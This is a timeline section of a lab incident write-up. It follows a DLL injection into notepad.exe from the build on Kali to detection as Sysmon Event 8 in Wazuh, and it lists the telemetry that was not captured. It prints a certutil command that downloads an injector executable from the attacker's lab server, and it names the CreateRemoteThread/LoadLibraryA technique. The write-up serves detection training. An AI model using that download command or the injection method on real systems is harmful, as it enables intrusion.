# 06 — Timeline

All times **UTC** unless noted. Kali runs on **EST (UTC-5)**; Wazuh dashboard renders **PHT (UTC+8)**.

| Time (UTC) | Event | Evidence |
|---|---|---|
| 2026-11-13 ~12:48 (07:48 EST on Kali) | `injector.exe` cross-compiled on Kali (`x86_64-w64-mingw32-gcc`), size 270465 bytes, mtime `Nov 13 07:48` | `evidence/02-kali-malicious-exe-built.png` |
| (before 12:49, not captured) | `inject.dll` built; `python3 -m http.server 80` started on Kali (192.168.100.107) | — (not captured) |
| (before injection) | Victim: `bryll` launches `notepad.exe`; `tasklist` confirms PID **2052** (Session 1, 15,976 K) | `evidence/01-win-target-process.png` |
| (before injection, not captured exact) | Victim: `certutil -urlcache -split -f http://192.168.100.107/injector.exe C:\Users\Public\injector.exe` → "CertUtil: -URLCache command completed successfully." | `evidence/04-win-injection-popup.png` (top) |
| (not captured) | `inject.dll` delivered to `C:\Users\Public\inject.dll` | — (not captured) |
| **2026-11-13 12:49:57.225** | **Sysmon EID 8 CreateRemoteThread**: `injector.exe` (PID 3128) → `notepad.exe` (PID 2052), NewThreadId 912, `KERNEL32.DLL!LoadLibraryA`. eventRecordID **12279**. | `evidence/wazuh-sysmon8-expanded.png` |
| ~12:49:57 (same moment) | Injector stdout: "Successfully injected! Waiting for thread completion..." | `evidence/04-win-injection-popup.png` (bottom) |
| ~12:49:57 (same moment) | `inject.dll` `DllMain` fires in `notepad.exe` → MessageBox **"PWNED" / "Injected into remote process - code exec"** | `evidence/04-win-injection-popup.png` (popup) |
| post-incident | Hunter queries `wazuh-archives-*` for `data.win.system.eventID: 8`; finds single event; expands JSON; confirms injection triad | `evidence/wazuh-sysmon8-expanded.png` |

## Clock / consistency note (recurring lab finding)

- Kali build mtime `Nov 13 07:48 EST` = **12:48 UTC**. Sysmon injection `utcTime` = **12:49:57.225 UTC**. Difference ≈ **2 minutes** — fully consistent with build → serve → download → execute. **No clock skew observed this run.**
- Wazuh dashboard (PHT, UTC+8) renders the event at **2026-11-13 20:49:57**. When reading screenshots, always convert dashboard local time back to UTC before correlating with Kali/Windows logs.
- Prior cases (Week 1, Kerberoasting, ASREP) showed larger offsets (NTP/DC drift); this run was clean. Document per-case.

## Gaps in the timeline (not captured — would tighten the chain)

- Exact `certutil` completion timestamp (Sysmon EID 1 for certutil).
- `inject.dll` delivery timestamp (second certutil / file creation — Sysmon EID 11).
- `injector.exe` process-creation timestamp (Sysmon EID 1, PID 3128).
- `OpenProcess` timestamp (Sysmon EID 10) — occurs milliseconds before EID 8.
- `inject.dll` image-load timestamp inside notepad (Sysmon EID 7) — occurs milliseconds after EID 8.
